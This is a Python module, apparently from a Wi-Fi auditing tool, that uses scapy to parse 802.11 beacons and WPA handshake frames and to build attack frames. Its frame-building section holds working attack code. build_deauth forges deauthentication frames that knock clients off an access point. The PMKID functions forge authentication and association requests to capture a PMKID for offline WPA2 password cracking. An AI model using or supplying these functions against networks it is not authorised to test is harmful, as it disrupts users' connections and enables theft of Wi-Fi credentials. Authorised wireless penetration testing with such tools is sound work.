"""Pure 802.11 parsing + frame-building helpers (no global state, no I/O).

Consolidated from netzero/utils.py and network-security/{scanner,deauth,pmkid,capture}.py
"""

from scapy.layers.dot11 import (
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Auth,
    Dot11AssoReq,
    Dot11Elt,
    RadioTap,
)
from scapy.layers.eap import EAPOL
from scapy.packet import Packet

from app.config import BROADCAST, EAPOL_MIC_BIT, EAPOL_SECURE_BIT


# --- parsing ------------------------------------------------------------------
def is_beacon(packet: Packet) -> bool:
    return packet.haslayer(Dot11Beacon)


def get_bssid(packet: Packet) -> str:
    return packet[Dot11].addr3


def get_rssi(packet: Packet) -> int:
    if (
        packet.haslayer(RadioTap)
        and hasattr(packet[RadioTap], "dBm_AntSignal")
        and packet[RadioTap].dBm_AntSignal is not None
    ):
        return int(packet[RadioTap].dBm_AntSignal)
    return -100


def parse_ssid(raw_ssid) -> str:
    if isinstance(raw_ssid, bytes):
        raw_ssid = raw_ssid.decode(errors="ignore")
    ssid = "".join(c for c in raw_ssid if c.isprintable()).strip()
    return ssid or "<Hidden>"


def parse_crypto(crypto) -> str:
    simplified = set()
    for c in crypto:
        if c.startswith("WPA3-transition"):
            simplified.update(["WPA2", "WPA3"])
        else:
            simplified.add(c.split("/")[0])

    order = {"OPN": 0, "WEP": 1, "WPA": 2, "WPA2": 3, "WPA3": 4}
    return "/".join(sorted(simplified, key=lambda x: order.get(x, 99)))


def is_unicast_client(mac: str) -> bool:
    """True if mac is a real unicast client (not broadcast/multicast)."""
    if not mac or mac == BROADCAST:
        return False
    try:
        return not (int(mac.split(":")[0], 16) & 1)
    except ValueError:
        return False


def data_frame_endpoints(packet: Packet):
    """Return (bssid, client) for an 802.11 data frame, or (None, None)."""
    to_ds = packet.FCfield & 0x01
    from_ds = (packet.FCfield & 0x02) >> 1
    mac1, mac2 = packet.addr1, packet.addr2
    if not mac1 or not mac2:
        return None, None
    if to_ds == 0 and from_ds == 1:
        return mac2, mac1
    if to_ds == 1 and from_ds == 0:
        return mac1, mac2
    return None, None


def eapol_message_type(eapol_payload: bytes, bssid: str, mac2: str) -> str:
    """Classify a WPA 4-way handshake EAPOL frame as M1..M4."""
    key_info = int.from_bytes(eapol_payload[5:7], byteorder="big")
    ap_to_client = mac2 == bssid
    if ap_to_client:
        return "M1" if not (key_info & EAPOL_MIC_BIT) else "M3"
    return "M2" if not (key_info & EAPOL_SECURE_BIT) else "M4"


# --- frame building -----------------------------------------------------------
def build_deauth(bssid: str, client: str):
    """Bidirectional deauth (kick the client and tell the AP the client left)."""
    kick = (
        RadioTap()
        / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    quit_ = (
        RadioTap()
        / Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    return [kick, quit_]


def build_pmkid_auth(bssid: str, client_mac: str):
    return (
        RadioTap()
        / Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
        / Dot11Auth(algo=0, seqnum=1, status=0)
    )


def build_pmkid_assoc(bssid: str, client_mac: str, ssid: str):
    dot11 = Dot11(type=0, subtype=0, addr1=bssid, addr2=client_mac, addr3=bssid)
    assoc = Dot11AssoReq(cap=0x3104, listen_interval=5)
    essid = Dot11Elt(ID="SSID", info=ssid.encode())
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x8c\x12\x98\x24")
    # WPA2-PSK (AES-CCMP) RSN element
    rsn = Dot11Elt(ID=48, info=bytes.fromhex("0100000fac040100000fac040100000fac028000"))
    return RadioTap() / dot11 / assoc / essid / rates / rsn


# PMKID signature inside EAPOL key data (RSN PMKID KDE: 00-0F-AC type 4)
PMKID_SIGNATURE = b"\x00\x0f\xac\x04"


def has_eapol(packet: Packet) -> bool:
    return packet.haslayer(EAPOL)
